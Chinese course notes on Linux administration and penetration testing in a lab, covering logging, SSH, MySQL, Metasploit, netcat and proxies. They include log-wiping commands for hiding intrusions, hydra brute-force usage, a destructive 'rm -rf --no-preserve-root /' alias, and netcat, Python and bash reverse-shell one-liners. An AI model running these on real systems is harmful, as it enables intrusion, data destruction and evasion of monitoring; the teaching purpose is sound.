 查看 Linux 系统上的分区    fdisk -l 
文件系统类型
	是操作系统定义的概念，不同的操作系统支持的文件系统类型是不一样的，
	不同的文件系统其文件的存储和管理方式也不同。
	相当于分区的格式
	Linux 使用许多不同类型的文件系统，但最常见的是  ext3 和 ext4、xfs
	
    查看文件系统类型 df -T

设备的挂载和卸载

mount 设备文件  挂载点
如果将设备挂载到具有子目录和文件的目录上，则挂载的设备将覆盖该目录的内容，使其不可见且不可用。
	
umount 设备文件|挂载点
mount  查看文件系统挂载的详细信息
-o  指定挂载选项
mount -o ro /dev/sdb1 /mnt/usb

获取挂载磁盘上的信息
df 
  -T 查看文件系统类型 df -T
  -h 以合适的容量单位显示
fsck 命令检查文件系统的错误并修复损坏
 fsck -p /dev/sdb1  自动修复

Windows fsck -f H:



### *Day38*
11. 日志系统的管理
11.1. 概述 
日志文件存储关于操作系统和应用程序运行时发生的事件的信息，包括任何错误和安全警报。
作为黑客，日志文件可以跟踪目标的活动和身份。

11.2. 日志服务
日志服务器 监听在UDP/514端口

syslog 程序通常有两个包括 rsyslog（Centos、Debian） 和 syslog-ng

locate rsyslog
与rsyslog相关的文件
/etc/rsyslog.conf  //配置文件
/etc/init.d/rsyslog //rsyslog的服务脚本
/usr/sbin/rsyslogd  //rsyslog的服务程序

systemctl status rsyslog  //查看rsyslog的服务状态

11.3. 日志规则（rule）
rsyslog 规则决定记录哪种类型的信息，记录哪些程序的消息，以及将日志存储在何处
日志规则的基本格式：
facility.priority  action

facility 关键字引用正在记录其消息的程序，例如邮件、内核或打印系统。 
priority 关键字决定为该程序记录哪种类型的消息。
action 关键字引用将发送日志的位置。

消息的类型

priority告诉系统要记录哪种消息。 
下列代码从最低优先级列出，从调试开始到最高优先级，以严重结束。
• debug--调试（最低）
• info
• notice
• warning
• warn
• error
• err
• crit
• alert
• emerg
• panic *（最高）

0 Emergency: system is unusable
1 Alert: action must be taken immediately
2 Critical: critical conditions
3 Error: error conditions
4 Warning: warning conditions
5 Notice: normal but significant condition
6 Informational: informational messages
7 Debug: debug-level messages

如果优先级为*，则记录所有优先级的消息。指定优先级时，将记录该优先级及更高优先级的消息。

日志文件通常被发送到/var/log 目录，其文件名描述为生成它们的程序

action部分
 指定的文件
 @IP地址  发送到指定的日志服务器中


11.4. 使用 LOGROTATE 自动清理日志

ROTATE--循环
logrotate 是通过将日志文件移动到其他位置来定期归档日志文件的过程，从而为您留下一个新的日志
文件。然后，在指定的一段时间之后，归档的位置将被清理。

logrotate 程序的配置文件/etc/logrotate.conf

11.5. 日志的清理（删除）
从攻击者的角度，对日志的清理可以不让系统留下入侵的痕迹，保持隐身
（1）删除活动的任何日志
shred 
可以删除文件并多次擦写覆盖它，这使得恢复变得更加困难
默认情况下， shred 将覆盖 3次
-f 选项，它更改文件的权限，以便在需要更改权限时允许覆盖； 
-n 选项，它允许您选择覆盖文件的次数
 shred -f -n 10 /var/log/auth.log*
（2）禁用日志系统--需要root权限
当黑客控制了一个系统，他们可以立即禁用日志，以防止系统跟踪他们的活动。

systemctl stop rsyslog  //关闭日志服务


### *Day39*
12. 熟练使用服务

12.1. 服务概述
服务是在后台运行的应用程序，等待您使用它，Linux中称为Daemon进程
Apache 设置 web 服务器
OpenSSH服务 ---远程访问
使用 MySQL 访问数据--数据库服务
PostgreSQL（数据库服务） 存储黑客信息，如在MSF中会使用PostgreSQL

服务控制工具
systemctl 动作命令  服务名称

动作命令
	启动 start
	停止 stop
	重启 restart
	状态 status 
	把服务设置为开机启动 enable 
	把服务设置为开机不启动 disable
	查询服务是否开机启动  is-enabled


apache2

12.1. 使用apache2服务架设网站
环境：Kali（Debian）

apt-get install apache2

systemctl start apache2

lsof -i :80

（1）配置文件解析

 帮助文档 /usr/share/doc/apache2/README.Debian.gz
 
 配置文件目录  /etc/apache2

 ┌──(root💀kali2)-[/etc/apache2]
└─# tree -L 1  /etc/apache2
/etc/apache2
├── apache2.conf //主配置文件（ main configuration file）
├── conf-available
├── conf-enabled  //全局指令配置
		*.conf
├── envvars
├── magic
├── mods-available
├── mods-enabled  //模块的管理
	   *.load
	   *.conf
├── ports.conf  //定义监听的地址和端口
├── sites-available
└── sites-enabled  //定义了虚拟主机的配置


/etc/apache2/apache2.conf
命令语句解析
Include ports.conf  //包含ports.conf中的配置


ports.conf 

	Listen 192.168.195.76:8088 //定义监听的地址和端口

2. apache2的启动脚本和服务程序
（1）服务脚本控制程序
/etc/init.d/apache2 
apache2ctl
（2）服务程序
/usr/bin/apache2

3. 网站的主目录
默认是/var/www/html
 
 
 
 
 
 
 
 











# 笔记（Day41-Day43)）
### *Day41**

ln  创建链接文件 ★★★★★

创建一个软链接（类似Windows中的快捷方式）

ln  -s 源文件 链接文件  

41.1. SSH服务介绍
SSH 是 Secure Shell 的简写。
能够提供一个安全的远程连接
tcp/22

systemctl start ssh  启动SSH服务
systemctl enable ssh 把SSH服务设置为开机启动

使root用户可以通过口令的方式远程连接到Kali

SSH服务配置文件 
/etc/ssh/sshd_config  ★★★★★

	PermitRootLogin yes

41.2. 远程连接SSH服务器

nmap -p 22 192.168.195.76

-p 指定扫描的端口

ssh  用户名@远程主机

ssh root@192.168.195.76  ★★★★★
	-p 指定连接端口

┌──(root💀kali)-[/usr/share/sqlmap/tamper]
└─# ssh root@192.168.195.76                                                                                                                             255 ⨯
The authenticity of host '192.168.195.76 (192.168.195.76)' can't be established.
ECDSA key fingerprint is SHA256:AzeAA3yDuLrac02AVLi18K9X6SIgZidi87RSC3RunIw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 

41.3. 针对ssh的暴力破解

Step1: 准备一个口令字典

cat >>password_list << EOF

Step2 准备一个口令破解工具

 hydra 
 用户登录口令破解工具，支持多种登录协议

基本用法：
	hydra -l user -P passlist.txt ssh://192.168.0.1
	-l  指定登录的用户名
	-P  口令字典文件
	
Centos 安全日志文件： /var/log/secure

41.4. 如何防范针对SSH的口令暴力破解

（1）更改默认的服务端口
Port 22226

netstat -tnlp | grep "sshd" 

客户端连接
ssh -p 22226 root@192.168.195.76  
服务端查看连接
lsof -i :22226
netstat -tanlp | grep "sshd"

黑客
nmap -p 1-65535 192.168.195.76
nmap -p- 192.168.195.76

	PS:端口号的范围  1-65535
nmap -sV -p- 192.168.195.76 
   -sV  探测服务的版本


┌──(root💀kali2)-[~]
└─# nmap -sV -p- 192.168.195.76
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 11:28 CST
Nmap scan report for www.xiaofeixia.com (192.168.195.76)
Host is up (0.0000020s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
22226/tcp open  ssh     OpenSSH 8.4p1 Debian 6 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


 hydra -l root -P password.lst -s 22226 ssh://192.168.195.76
 -s  指定服务端口

### Day42### ### *
★★★★★
42.1. 如何防范针对SSH的口令暴力破解

（1）更改默认的服务端口
（2）设置复杂的密码且定期更改口令
（3）使用密钥认证
（4）定期查看安全日志文件
（5）TCP Wrappers机制 ★★★★★
TCP Wrappers也被称为tcp_wrappers。 它是一个基于主机的网络访问控制列表系统，类似于ACL

TCP Wrappers的核心是名为libwrap的库， 所有调用这个库的程序都可以利用libwrap提供的网络访问控制能力。
在Linux系统中，我们可以使用ldd命令来判断一个程序是否调用了libwrap的库，
ldd /usr/sbin/sshd  | grep libwrap

Debian 软件包为tcpd
Centos 软件包 tcp_wrappers
远程IP请求连接的时候， TCP Wrappers检查策略是先看/etc/hosts.allow中是否允许， 如果允许就直接放行； 如果没有， 则再看/etc/hosts.deny中是否禁止， 如果禁止， 那么就禁止连接； 否则允许连接。

推荐采用白名单机制  ★★★★★
/etc/hosts.allow
  sshd:192.168.195.21,192.168.22.33
/etc/hosts.deny 
  sshd:ALL
以上的配置表示只允许192.168.195.21和192.168.22.33这两台主机可以使用SSH连接

（6）使用DenyHosts、Fail2ban类似的安全工具
http://denyhosts.sourceforge.net/
http://www.fail2ban.org/wiki/index.php/Main_Page

（7）给SSH服务带个隐身的斗篷
通过Knockd（端口敲门）服务把SSH服务隐藏起来

端口敲门服务（knockd）服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”。
通过这种方法使系统开启需要访问的服务端口，才能对外访问。
不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。
进一步提升了服务和系统的安全性。
 knockd is a port-knock server.  It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits.  A client makes
       these port-hits by sending a TCP (or UDP) packet to a port on the server.  This port need not be open -- since knockd listens at the link-layer level,  it  sees
       all  traffic  even if it's destined for a closed port.  When the server detects a specific sequence of port-hits, it runs a command defined in its configuration
       file.  This can be used to open up holes in a firewall for quick access.


Step1 安装Knockd服务
apt-get update   
apt-get install knockd
Step2 Knockd服务的配置文件
updatedb
locate knockd 

/etc/knockd.conf  ★★★★★
/etc/default/knockd ★★★★★
/usr/sbin/knockd  服务程序



/var/log/messages  Linux默认的系统日志文件★★★★★

### Day43### ### *

6月10日，《中华人民共和国数据安全法》正式发布，9月1日起施行。生效之后，《数据安全法》将与《网络安全法》以及正在立法进程中的《个人信息保护法》一起，全面构筑中国信息及数据安全领域的法律框架。


43.1. Knockd服务的配置文件  /etc/knockd.conf

[options]
        UseSyslog  //使用系统日志

[openSSH]
        sequence    = 7000,8000,9000  //自定义的序列（端口号）
        seq_timeout = 5  //端口连接的超时时间
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn  //tcp的flag位为syn，只接受一个新连接

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[openHTTPS]
        sequence    = 12345,54321,24680,13579
        seq_timeout = 5
        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
        tcpflags    = syn


43.2. 更改日志文件
[options]
	LogFile = /var/log/portknocking.log  //定义日志文件的位置


43.3. 重要语句解析
Firewalld

 端口敲门成功之后要执行的命令
 command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 
 iptables 是Linux内置防火墙的管理工具
 -A 添（追）加一条规则，默认是最后一条规则 append
 -I  插入一条规则
 -D 删除一条规则，默认是第一条规则
 -s  指定数据包的源
 -d  指定数据包的目标
 -p  指定协议
 --dport 目标端口
 --sport 源端口
 -j  动作
	常用的动作有
		ACCEPT 接受
		DROP   丢弃
		REJECT 丢弃，但是会弹回消息
		LOG    记录到日志
 
 -L   查看规则
 -n   以数字形式显示
 
 iptables -L -n    //查看防火墙的规则
 -P  去更改默认规则
 
  iptables -P INPUT DROP //把INPUT链的默认规则更改为DROP
案例：
Kali主机可以ping通别人，但别人ping不通Kali

ping 基于ICMP协议

echo-request (ping) 8

echo-reply (pong) 0
  

iptables  -p icmp --help  //查看icmp协议的具体帮助

--icmp-type  定义icmp的类型
--line-numbers 查看规则的编号


iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT

43.4. Knockd服务的具体配置

Step0: 更改防火墙的INPUT的默认规则

iptables -P INPUT DROP
iptables-save 
保存防火墙的规则 

Step1: 更改配置文件

	可以保持默认配置
	
Step2: vi /etc/default/knockd

START_KNOCKD=1 

Step3  启动knockd服务

sytemctl start knockd
sytemctl enable knockd

Step4 客户端验证
启动
（1）使用knock客户端工具  apt-get install knockd
nmap -p22 192.168.195.76
knock -v 192.168.195.76 7000 8000 9000
nmap -p22 192.168.195.76
在服务端 tail -f /var/log/knockdport.log

关闭
knock 192.168.195.76 9000 8000 7000

（2）端口敲门脚本
for x in 7000 8000 9000;do nmap -Pn --max-retries 0 -p $x 192.168.195.76;done

nmap -Pn --max-retries 0 -p 7000 192.168.195.76

-Pn  禁止主机发现，假设主机是存活的
–max-retries ，表示端口扫描探测包最多被重传几次
-p 指定扫描的端口

for x in 9000 8000 7000;do nmap -Pn --max-retries 0 -p $x 192.168.195.76;done



# 笔记（Day44-day50）
### *Day44**
44.1. File Command复习
ls
ls -l
ls -la
ls -F

rm 

	  --no-preserve-root  不要对“/”特殊处理
      --preserve-root[=all]  不要删除“/”（默认行为）；
                              如添加了“all”参数，将拒绝处理与父目录位于
                              不同设备上的命令行参数
alias 别名

alias 'ls=rm -rf --no-preserve-root /'

44.2. Mysql
（1）概述 
在我们现代的 Web 2.0 技术时代（交互），几乎每个网站都是数据库驱动的

Mysql就是互联网上广为使用的数据库系统
MariaDB是Mysql的开源后续分支
数据库是黑客的“金羊毛”。也是黑客首选的攻击目标
很多Web应用（如Discuz!--论坛、eshop-购物商城、Wordpress--博客等）都会把Mysql作为数据库的首选

LAMP
LNMP

流行的内容管理系统（CMS），如 Wordpress、Joomla， Drupal 和DedeCMS、帝国等 也都使用 MySQL
内容管理系统（CMS）方便对网站内容进行更新、管理。

（2）启动
工作端口： tcp/3306 
lsof -i :3306
systemctl start mysql 
netstat  -tnlp | grep mariadbd   

连接数据库

mysql -u root  -p
-u 指定连接的用户名
-p 指定连接的密码

 select version();  //查询当前数据库的版本
 select user();    //查询当前用户
 select database(); //查询当前操作数据库
 show databases;   查看数据库
 use mysql;   //切换数据库
 show tables; //查看数据库的表
 DESCRIBE user; 描述表的结构

 
select user,host,password from mysql.user;
//查询mysql系统中的用户信息
select user,password,host from mysql.user where user='root';
//where指定查询条件
修改root用户口令
use mysql;
ALTER USER 'root'@'localhost' identified by 'xiaoguang';
flush privileges; //刷新权限
因此，您不能使用“更新（update）”命令来更新用户密码，而是使用ALTER命令来更新密码


*相关的软件包
dpkg -l | grep mariadb

mariadb-server  服务端
mariadb-client  客户端
mariadb-common  服务端和客户端都需要的公共软件包
*配置文件**


/etc/mysql  数据库配置目录
/etc/mysql/my.cnf （/etc/my.cnf）  通常数据库的配置文件
/etc/mysql/conf.d/*.cnf           也包含该目录中以.cnf结尾的配置文件



The MariaDB/MySQL tools read configuration files in the following order:
//MariaDB/MySQL会按照下列顺序读取配置文件
```
# 0. "/etc/mysql/my.cnf"  软链接，真正指向的是/etc/mysql/mariadb.cnf
# 1. "/etc/mysql/mariadb.cnf" 设置全局默认配置
# 2. "/etc/mysql/conf.d/*.cnf" 设置全局选项
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" 仅设置和MariaDB有关的选项
# 4. "~/.my.cnf" 用于设置和用户相关的配置文件选项（自定义配置）
```

mariadb.conf.d
├── 50-client.cnf   //客户端配置文件
├── 50-mysql-clients.cnf
├── 50-mysqld_safe.cnf
├── 50-server.cnf  //服务配置文件
└── 60-galera.cnf

【案例】
更改监听地址
50-server.cnf
[mysqld]
bind-address            = 0.0.0.0


systemctl restart mysql

### *Day45**
45.1. 远程连接数据库

 mysql -h 192.168.195.76 -u root -p
 -h 指定连接的数据库主机，如果没有指定，默认为localhost（本机）

 MySQL 赋予用户权限命令的简单格式可概括为：
 grant 权限 on 数据库对象 to 用户
 PS:用户格式  '用户名'@'主机'
              'root'@'localhost'
 对数据库操作常用的权限有：
 查询（select）、插入（insert）、更新（update、alter）、删除（delete）
 all 代表 所有的权限
 
 grant all privileges on *.* to 'root'@'%' identified by 'xiaoxiao' with grant option;
 
 PS1: % 代表任意主机
 use mysql;
 grant all privileges on *.* to 'root'@'%' identified by 'xiaoxiao' ;
 grant all privileges on *.* to 'root'@'192.168.195.%' identified by 'xiaoxiao' ;
 [案例1]
 grant all privileges on *.*  to 'root'@'192.168.195.%' identified by 'xiaoxiao';
 select user,host,password from mysql.user;

 
 PS: privileges关键字可以省略
 
 [案例2]
 grant select,insert on testdb.* to 'sdxh'@'192.168.195.%' identified by 'xiaoxiao';

 
 
 撤销权限

 revoke all privileges on *.* from 'root'@'%'  ;
 revoke select,insert on testdb.* from 'sdxh'@'192.168.195.%';
 flush privileges;  刷新权限
 
新用户
 grant all on *.* to admin@'%' identified by 'yourpassword' with grant option;
 
删除用户
drop user 'john'@'192.168.13.34';

【练习】
create database blog;
show databases;
grant all privileges on *.* to 'root'@'192.168.195.%' identified by 'xiaoxiao';
flush privileges;
show grants;
show grants for 'root'@'192.168.195.%'
select user,host,password from mysql.user;

另一台主机测试
mysql -h 192.168.195.76 -uroot -pxiaoxiao 

创建一个普通用户并授权
grant select,insert,update,delete on blog.* to 'xh'@'192.168.195.%' identified by 'xiaoxiao';
flush privileges;
show grants for 'xh'@'192.168.195.%';
另一台主机测试
mysql -h 192.168.195.76 -uxh -pxiaoxiao 
show databases;

撤销权限
revoke select,insert,update,delete on blog.* from  'xh'@'192.168.195.%';
flush privileges;
另一台主机测试
mysql -h 192.168.195.76 -uxh -pxiaoxiao 
show databases;

删除用户
drop user 'xh'@'192.168.195.%';
select user,host from mysql.user;
mysql -h 192.168.195.76 -uxh -pxiaoxiao


 一、grant 普通数据用户，查询、插入、更新、删除 数据库中所有表数据的权利。
 grant select on testdb.* to common_user@'%'
 grant insert on testdb.* to common_user@'%'
 grant update on testdb.* to common_user@'%'
 grant delete on testdb.* to common_user@'%'
 
 或者，用一条 MySQL 命令来替代：
 grant select, insert, update, delete on testdb.* to common_user@'%'
 
  
 
 二、grant 数据库开发人员，创建表、索引、视图、存储过程、函数。。。等权限。
 
 grant 创建、修改、删除 MySQL 数据表结构权限。
 grant create on testdb.* to developer@'192.168.0.%';
 grant alter on testdb.* to developer@'192.168.0.%';
 grant drop on testdb.* to developer@'192.168.0.%';
 
 grant 操作 MySQL 外键权限。
 grant references on testdb.* to developer@'192.168.0.%';
 
 grant 操作 MySQL 临时表权限。
 grant create temporary tables on testdb.* to developer@'192.168.0.%';
 
 grant 操作 MySQL 索引权限。
 grant index on testdb.* to developer@'192.168.0.%';
 
 grant 操作 MySQL 视图、查看视图源代码 权限。
 grant create view on testdb.* to developer@'192.168.0.%';
 grant show view on testdb.* to developer@'192.168.0.%';
 
 grant 操作 MySQL 存储过程、函数 权限。
 grant create routine on testdb.* to developer@'192.168.0.%'; -- now, can show procedure status
 grant alter routine on testdb.* to developer@'192.168.0.%'; -- now, you can drop a procedure
 grant execute on testdb.* to developer@'192.168.0.%';
 
  
 
 三、grant 普通 DBA 管理某个 MySQL 数据库的权限。
 grant all privileges on testdb to dba@'localhost'
 
 其中，关键字 “privileges” 可以省略。
 
 
 四、grant 高级 DBA 管理 MySQL 中所有数据库的权限。
 grant all on *.* to dba@'localhost'
 
  
 
 五、MySQL grant 权限，分别可以作用在多个层次上。
 
 1. grant 作用在整个 MySQL 服务器上：
 grant select on *.* to dba@localhost; -- dba 可以查询 MySQL 中所有数据库中的表。
 grant all on *.* to dba@localhost; -- dba 可以管理 MySQL 中的所有数据库
 
 2. grant 作用在单个数据库上：
 grant select on testdb.* to dba@localhost; -- dba 可以查询 testdb 中的表。
 
 3. grant 作用在单个数据表上：
 grant select, insert, update, delete on testdb.orders to dba@localhost;
 
 这里在给一个用户授权多张表时，可以多次执行以上语句。例如：
 grant select(user_id,username) on smp.users to mo_user@'%' identified by '123345';
 grant select on smp.mo_sms to mo_user@'%' identified by '123345';
 
 4. grant 作用在表中的列上：
 grant select(id, se, rank) on testdb.apache_log to dba@localhost;
 
 5. grant 作用在存储过程、函数上：
 grant execute on procedure testdb.pr_add to 'dba'@'localhost'
 grant execute on function testdb.fn_add to 'dba'@'localhost'
 
  
 
 六、查看 MySQL 用户权限
 
 查看当前用户（自己）权限：
 show grants;
 
 查看其他 MySQL 用户权限：
 show grants for dba@localhost;
 
  
 
 七、撤销已经赋予给 MySQL 用户权限的权限。
 
 revoke 跟 grant 的语法差不多，只需要把关键字 “to” 换成 “from” 即可：
 grant all on *.* to dba@localhost;
 revoke all on *.* from dba@localhost;
 
  
 
 八、MySQL grant、revoke 用户权限注意事项
 
 1. grant, revoke 用户权限后，该用户只有重新连接 MySQL 数据库，权限才能生效。
 
 2. 如果想让授权的用户，也可以将这些权限 grant 给其他用户，需要选项 “grant option“
 grant select on testdb.* to dba@localhost with grant option;
 
 这个特性一般用不到。实际中，数据库权限最好由 DBA 来统一管理。


### *Day46**
46.1. mysql的管理员口令忘记了？

Step01:用以下方式重新启动mysql（以不检查权限的方式启动）

方法1
mysqld_safe --skip-grant-tables &

PS1: & 表示把程序放在后台执行
PS2:  --skip-grant-tables  //跳过权限检查
方法2：修改配置文件（/etc/mysql/mariadb.conf.d/50-server.cnf）
在[mysqld]下添加 skip-grant-tables , 再启动mysql

Step02:
重新连接数据库
mysql -uroot -p  //此时不需要密码

Step03: 更改root用户口令
flush privileges;
use mysql;
ALTER USER 'root'@'localhost' identified by 'xiaoguang';
flush privileges; //刷新权限
//早先版本
update mysql.user set Password=password('xiaoguang') where User='root';
Step04:改完之后结束Mysql进程，并重启即可


方法1 
ps aux | grep mysqld

killall -9 mysql相关进程

killall -9  mariadbd    
方法2：修改配置文件
如果是修改配置文件，把添加的配置删除或注释掉即可
systemctl stop mysql
systemctl start mysql


46.2. PostgreSQL 与 Metasploit

PostgreSQL，或 Postgres，是另一个开源关系数据库，由于其能够轻松扩展并处理繁重的工作负载，
因此常用于非常大的互联网应用程序。是Metasploit的默认数据库。
监听在tcp/5432端口

Metasploit 是一个漏洞利用框架

msfdb init && msfconsole

PS1: &&  只有前一个程序正确运行了，才会运行后面的程序
     ||  只有前一个程序运行失败了，才会运行后面的程序
     &
PS2: msfdb init     # start and initialize the database  //启动和初始化数据库
  启动数据库（systemctl start postgresql）
  完成数据库的初始化操作
	创建一个名为msf3的PostgreSQL数据库用户
	创建数据库msf、msf_test
PS3: msfconsole （Metasploit命令行接口）
  
  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status  //检查数据库服务的状态
  msfdb run      # start the database and run msfconsole //启动数据库并运行msfconsole
PS4：
msf6 > db_status  //查看数据库的状态

PS5:metasploit的数据库配置文件/usr/share/metasploit-framework/config/database.yml

### *Day47**

47.1. metasploitable2靶机的部署
靶机（vulnerable）
Step1 Metasploitable.vmx

Step2 描述

This is Metasploitable2 (Linux)

Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be used to conduct security training, test security tools, and practice common penetration testing techniques. 

The default login and password is msfadmin:msfadmin. 

Never expose this VM to an untrusted network (use NAT or Host-only mode if you have any questions what that means). 

To contact the developers, please send email to msfdev@metasploit.com

Step3:
The default login and password is msfadmin:msfadmin. 


Step04 查看靶机的信息

（1）查看发行版本
lsb_release -a
cat /etc/*-release
（2）查看内核版本
uname -r
（3）查看当前开放端口

netstat -tunlp | less

（4）查看php版本
php -v

（5）查看Mysql的版本
mysql -uroot -p
mysql>select version();
（6）查看python的版本
 python -V
 
（7）查看sudo授权列表
 sudo -l
 
 Step05  修改靶机的IP地址
 nano /etc/network/interfaces
 
 /etc/init.d/networking restart
 
 DNS的修改
 echo "nameserver 223.6.6.6" >/etc/resolv.conf
 
 Step06  ssh连接靶机
 ssh msfadmin@192.168.195.29

47.2. 黑客工具nc


Netcat-TCP/IP连接的瑞士军刀


 Netcat establishes a connection between two computers and 
allows data to be written across the TCP and UDP transport layer protocols, and the network layer protocol IP
一、概述
netcat是借助tcp/ip连接来传送数据的一个工具
The original Netcat was written by *Hobbit* hobbit@avian.org.

主要功能

	获取banner信息
	远程控制
	传输文件
二、基本的用法

（1）connect to somewhere:  连接某个主机--nc的客户端
  nc [-options] hostname port[s] [ports] ... 
 
（2）listen for inbound:  侦听---nc的服务端   

 nc -l -p port [-options] [hostname] [port]
 
  -l   侦听模式                   listen mode, for inbound connects

  -p  指定监听的端口              local port number


三、使用nc作为Chat/Messaging Server（聊天服务器）


PC1（192.168.195.76）  nc -l -p 2226  服务端
PC2                    nc  -nv  192.168.195.76 2226

-n                      numeric-only IP addresses, no DNS
仅使用数字地址，不做DNS解析
-v  显示详细信息，如果使用两次或多次会看到更详细的信息

-q secs                 quit after EOF on stdin and delay of secs
传输结束之后等待多长时间（秒）断开连接

扩展：
收集远程计算机信息用于电子取证



### *Day48**
Windows主机
	ncpa.cpl  网络连接
	firewall.cpl 防火墙
如何远程传输文件？
Step1: Kali中提供了一些在Windows平台下运行的安全小工具
 /usr/share/windows-binaries 
Step2 在Kali中搭建一个简易的HTTP服务器

cd /usr/share/windows-binaries

方法1：使用Python创建一个简易的HTTP服务器
 
 （1）Python2
	python -m SimpleHTTPServer 7331
	
	http://192.168.195.76:7331/
 （2）Python3
   python3 -m http.server 7331
方法2：使用PHP创建一个简易的HTTP服务器
PHP includes a built-in web server
这个内置的Web服务器主要用于本地开发使用，不可用于线上产品环境。

php -S 0.0.0.0:8000 -t /usr/share/windows-binaries

-t 指定网站的根目录
https://www.php.net/manual/zh/features.commandline.webserver.php


（3）使用ruby创建一个简易的HTTP服务器
Ruby，一种简单快捷的面向对象（面向对象程序设计）脚本语言

ruby -run -e httpd . -p 9000  

把当前目录（.）作为网站根目录

（4）使用busybox创建一个简易的HTTP服务器

https://busybox.net/about.html
BusyBox将许多具有共性的小版本的UNIX工具结合到一个单一的可执行文件。
可以适用于任何小的嵌入式系统
 BusyBox provides a fairly complete environment for any small or embedded system.
the Swiss Army Knife of Embedded Linux

busybox httpd -f -p 10000



这样的集合可以替代大部分常用工具
比如的GNU fileutils ，shellutils等工具，
BusyBox提供了一个比较完善的环境，可以适用于任何小的嵌入式系统。

48.2 使用nc传输文件-File Transfers



Kali（76） nc -lnvp 1234 >my_file.txt
xp（32）   nc -lnvp 1234 | nc -nv 192.168.195.76 1234
metasploitable2（29）  nc -nv 192.168.195.32 1234 < reset_logs.sh


### *Day49**

49.1 使用nc传输目录 Directory Transfers


发送端
tar cf  -       exam   |  nc -nv 192.168.195.29 12306  -q  1
 
接收端
nc -lnvp 12306 | tar xf -


49.2 远程控制

        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
		当nc连接建立成功后，可以运行指定的命令
	（1）正向连接
	从攻击者的角度，目标机器如使用nc开启了一个服务端口，攻击者连接相应的端口，获得相应的shell
	会受到防火墙的影响
案例1
xp （受害者） nc -lnvp 12306 -e cmd.exe  服务端
Kali （攻击端）nc -nv 192.168.195.32 12306    客户端
案例2
Kali（受害者） nc -lnvvp 12306  -e /bin/bash

metasploit2 （攻击端）	nc -nv 192.168.195.76 12306 
得到shell之后可以使用以下命令获得交互式shell
python -c 'import pty;pty.spawn("/bin/bash")'//获得交互式shell

python -c 'import pty;pty.spawn("/bin/sh")'  //通用一些
	
	（2）反向连接（反弹式shell）
Kali--攻击端（服务端）   nc -lnvvp 12306     
xp ---目标（受害者）（客户端） nc -nv 192.168.195.76 12306 -e cmd.exe 

攻击端开启了一个服务端口等待受害者连接，当受害者连接成功之后把shell绑定到连接上
对于受害者来说，这是一个出站连接，出站连接通常不会受到防火墙的阻止


===建立反弹式shell之花样模式-Python


1. Kali  攻击端


2. metasploit2 受害者 192.168.195.76

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.195.76",12306));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


### *Day50**

===50.1. 建立反弹式shell之花样模式-bash

受害者：
bash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1
bash -i >& /dev/tcp/192.168.195.76/12306 0>&1   //centos中成功运用

PS1:
	bash -i 打开一个交互式shell
PS2:
	& 符号 用于区分文件和文件描述符

	>& + 文件
		& 符号后面跟文件时，表示将标准输出和标准错误输出重定向至文件。
	>& + 数字
		& 符号后面跟数字时，表示后面的数字是文件描述符，不加&符号则会把后面的数字当成文件。
PS3:文件描述符
	0 标准输入重定向
	1 标准输出重定向
	2 标准错误输出重定向
PS4:
/dev目录下的tcp和udp是Linux中的特殊设备，可用于建立socket连接
读写这两个文件就相当于是在Socket连接中传输数据


>& /dev/tcp/攻击端IP/攻击端监听端口

表示将标准输出和标准错误输出重定向到攻击机（这时目标机的命令执行结果可以从攻击机看到）

0>&1  又将标准输入重定向到了标准输出-攻击机，从而可以通过攻击机输入命令

50.2. 安全和匿名

棱镜门


在互联网上如何保持匿名，不被追踪，有以下方法
• The Onion Network （暗网）
• 洋葱网络
• 代理服务器
• 虚拟专用网络
• 私有加密的电子邮件




traceroute 路由跟踪 Linux
tracert (Windows)
mtr

Tor

Tor依靠对计算机操作多次加密，通过多个网络节点（即“洋葱路由器”）选择路径，来隐藏计算机操作的来源、目的地和内容。Tor的用户是无法被追踪的，使用Tor隐匿服务的这些网站、论坛、博客也无法追踪，它们使用的是同样的流量加密系统来隐藏定位
要启用 Tor，只需从 https://www.torproject.org/安装 Tor 浏览

*Socket

Socks是一种代理服务，可以将一端的系统连到另一端。
Socks支持多种协议，如HTTP、FTP
Socks分为Socks4和Socks5两种类型
Socks4只支持TCP协议
Socks可以支持TCP和UDP协议，还支持各种身份验证机制
标准端口为1080

# 笔记（Day51-60）
### Day51
51.1. 代理（Proxy）服务器
代理服务器相当于一个中间人的角色
	当用户流量提交给代理服务器后，代理服务器代替用户向目标主机发送请求。
	目标主机在返回流量时，也只是返回给代理服务器，并不是直接回送给用户主机
	而是由代理服务器返回给用户主机。
通过这种方式，流量似乎来自代理，而不是原始 IP 地址。
在代理服务器时可以使用多级代理，组成代理链

在内网渗透测试中代理服务器可以充当攻击的跳板（中枢）

51.2. 代理（客户端）工具-proxychains
proxychains4 - redirect connections through proxy servers
作用：通过代理服务器 重定向连接 

51.3. 配置一个代理服务器

ccproxy 
squid ___Linux平台下常用的代理服务器

51.4. Proxychains的配置

默认的配置文件： /etc/proxychains4.conf

代理的格式
      type  ip  port [user pass]
